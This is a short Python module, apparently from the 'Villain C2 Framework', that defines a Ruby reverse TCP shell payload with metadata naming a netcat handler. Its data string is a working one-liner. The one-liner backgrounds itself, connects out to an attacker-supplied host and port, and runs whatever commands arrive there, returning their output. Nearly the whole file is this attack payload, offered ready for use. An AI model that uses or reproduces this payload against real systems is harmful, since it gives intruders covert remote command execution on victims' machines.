# This module is part of the "Villain C2 Framework"

from typing import ClassVar


class Payload:

    info: ClassVar[dict] = {
        'Title' : 'Ruby no sh reverse TCP',
        'Author' : 'Unknown',
        'Description' : 'Ruby no sh reverse TCP',
        'References' : ['https://revshells.com']
    }

    meta: ClassVar[dict] = {
        'handler' : 'netcat',
        'type' : 'ruby-no-sh-reverse-tcp',
        'os' : 'linux' 
    }

    config: ClassVar[dict] = {}

    parameters: ClassVar[dict] = {
        'lhost' : None
    }

    attrs: ClassVar[dict] = {}

    data = "nohup ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"*LHOST*\",\"*LPORT*\");loop{c.gets.chomp!;(exit! if $_==\"exit\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{$_}\"}' > /dev/null 2>&1 & disown"
